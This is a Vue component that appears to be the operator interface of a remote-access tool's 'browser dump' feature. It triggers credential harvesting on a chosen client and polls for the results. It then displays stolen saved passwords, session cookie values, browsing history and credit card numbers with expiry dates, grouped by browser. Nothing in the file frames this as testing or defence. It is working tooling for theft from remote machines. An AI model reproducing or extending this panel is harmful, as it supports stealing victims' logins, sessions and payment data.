<template>
  <div class="browser-dump-container">
    <el-card shadow="never" class="toolbar-card">
      <div class="toolbar-content">
        <h2 class="toolbar-title">{{ t('bd.title') }}</h2>
        <el-button type="primary" @click="startDump" :loading="dumping">
          {{ dumping ? t('bd.dumping') : t('bd.start') }}
        </el-button>
      </div>
    </el-card>

    <div v-if="loading" v-loading="loading" style="height: 200px" />

    <div v-if="dumping && rawResults.length === 0" class="empty-state">
      <el-empty :description="t('bd.dumpingWait')" />
    </div>

    <div v-if="!loading && !dumping && rawResults.length === 0" class="empty-state">
      <el-empty :description="t('bd.empty')" />
    </div>

    <div v-if="Object.keys(groupedData).length > 0" class="results-list">
      <div v-for="(group, browserName) in groupedData" :key="browserName" class="browser-group">
        <el-card shadow="hover" class="browser-card">
          <template #header>
            <div class="browser-header">
              <span class="browser-name">{{ browserName }}</span>
              <el-button size="small" type="danger" @click="deleteBrowser(browserName)">
                <el-icon><Delete /></el-icon>
              </el-button>
            </div>
          </template>

          <el-collapse v-model="activeCollapse">
            <el-collapse-item v-if="group.password?.length" :title="t('bd.passwords')" :name="browserName+'-password'">
              <el-table :data="group.password" size="small" border max-height="300" style="width:100%">
                <el-table-column prop="url" label="URL" min-width="200" show-overflow-tooltip />
                <el-table-column prop="username" :label="t('credentials.username')" min-width="120" />
                <el-table-column prop="password" :label="t('bd.password')" min-width="120" />
                <el-table-column prop="created_at" :label="t('bd.createdAt')" min-width="160" />
              </el-table>
            </el-collapse-item>

            <el-collapse-item v-if="group.cookie?.length" title="Cookie" :name="browserName+'-cookie'">
              <el-table :data="group.cookie" size="small" border max-height="300" style="width:100%">
                <el-table-column prop="host" :label="t('cred.domain')" min-width="150" show-overflow-tooltip />
                <el-table-column prop="name" :label="t('bd.name')" min-width="120" />
                <el-table-column prop="value" :label="t('bd.value')" min-width="200" show-overflow-tooltip />
                <el-table-column prop="path" :label="t('files.path')" width="100" />
                <el-table-column prop="is_secure" label="Secure" width="80" />
                <el-table-column prop="is_http_only" label="HttpOnly" width="80" />
              </el-table>
            </el-collapse-item>

            <el-collapse-item v-if="group.history?.length" :title="t('bd.history')" :name="browserName+'-history'">
              <el-table :data="group.history" size="small" border max-height="300" style="width:100%">
                <el-table-column prop="url" label="URL" min-width="250" show-overflow-tooltip />
                <el-table-column prop="title" :label="t('bd.titleCol')" min-width="150" show-overflow-tooltip />
                <el-table-column prop="visit_count" :label="t('bd.visitCount')" width="90" />
                <el-table-column prop="last_visit" :label="t('bd.lastVisit')" width="160" />
              </el-table>
            </el-collapse-item>

            <el-collapse-item v-if="group.creditcard?.length" :title="t('bd.creditcard')" :name="browserName+'-creditcard'">
              <el-table :data="group.creditcard" size="small" border max-height="200" style="width:100%">
                <el-table-column prop="name" :label="t('bd.cardHolder')" min-width="120" />
                <el-table-column prop="number" :label="t('bd.cardNumber')" min-width="160" />
                <el-table-column prop="exp_month" :label="t('bd.month')" width="60" />
                <el-table-column prop="exp_year" :label="t('bd.year')" width="60" />
              </el-table>
            </el-collapse-item>
          </el-collapse>
        </el-card>
      </div>
    </div>
  </div>
</template>

<script setup>
import { useI18n } from 'vue-i18n'
const { t } = useI18n()
import { ref, computed, onMounted } from 'vue'
import { ElMessage, ElMessageBox } from 'element-plus'
import ClientAPI from '@/api/clients'
import { useRoute } from "vue-router"

const route = useRoute()
const uid = route.query.uid

const rawResults = ref([])
const loading = ref(false)
const dumping = ref(false)
const activeCollapse = ref([])
const autoRefreshId = ref(null)

const groupedData = computed(() => {
  const groups = {}
  for (const item of rawResults.value) {
    try {
      const parsed = JSON.parse(item.content)
      if (typeof parsed === 'object' && parsed.browser && parsed.category) {
        const browser = parsed.browser
        const category = parsed.category
        if (!groups[browser]) {
          groups[browser] = { password: [], cookie: [], history: [], creditcard: [] }
        }
        if (Array.isArray(parsed.entries)) {
          groups[browser][category] = groups[browser][category].concat(parsed.entries)
        }
      }
    } catch {}
  }
  return groups
})

const loadResults = async () => {
  loading.value = true
  try {
    const res = await ClientAPI.listDumpBrowser({ uid })
    if (res.data.status === 200) {
      rawResults.value = res.data.data || []
    }
  } catch {
    // silent
  } finally {
    loading.value = false
  }
}

const startDump = async () => {
  dumping.value = true
  try {
    const res = await ClientAPI.DumpBrowser({ uid })
    if (res.data.status === 200) {
      ElMessage.success(t("bd.started"))
      // auto-refresh up to 60 seconds while results come in
      let attempts = 0
      autoRefreshId.value = setInterval(async () => {
        await loadResults()
        attempts++
        if (attempts > 20) {
          clearInterval(autoRefreshId.value)
          autoRefreshId.value = null
          if (rawResults.value.length === 0) {
            ElMessage.info(t('bd.noResults'))
          }
        }
      }, 3000)
    } else {
      ElMessage.error(res.data.data || t('bd.startFailed'))
    }
  } catch {
    ElMessage.error(t('bd.startFailed'))
  } finally {
    dumping.value = false
  }
}

const deleteBrowser = async (browserName) => {
  try {
    await ElMessageBox.confirm(t('bd.deleteConfirm', { browser: browserName }), t('common.notice'), {
      confirmButtonText: t('common.confirm'),
      cancelButtonText: t('common.cancel'),
      type: 'warning',
    })
    const ids = rawResults.value
      .filter(r => {
        try {
          const p = JSON.parse(r.content)
          return typeof p === 'object' && p.browser === browserName
        } catch { return false }
      })
      .map(r => r.id)
    for (const id of ids) {
      await ClientAPI.deleteDumpBrowser(id)
    }
    ElMessage.success(t('common.deleted'))
    loadResults()
  } catch {
    // cancelled
  }
}

onMounted(() => {
  loadResults()
})
</script>

<style scoped>
.browser-dump-container {
  padding: 20px;
}

.toolbar-card {
  margin-bottom: 20px;
}

.toolbar-content {
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.toolbar-title {
  margin: 0;
  font-size: 18px;
  color: #303133;
}

.empty-state {
  margin-top: 60px;
}

.results-list {
  display: flex;
  flex-direction: column;
  gap: 16px;
}

.browser-card {
  border-radius: 12px;
}

.browser-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.browser-name {
  font-size: 16px;
  font-weight: 600;
  color: #303133;
}

.browser-card :deep(.el-table thead th) {
  color: #303133 !important;
  background-color: #f5f7fa !important;
}

.browser-card :deep(.el-table thead th .cell) {
  color: #303133 !important;
}

.browser-card :deep(.el-table__header-wrapper) {
  background-color: #f5f7fa !important;
}

.browser-card :deep(.el-collapse-item__header) {
  color: #303133 !important;
}
</style>
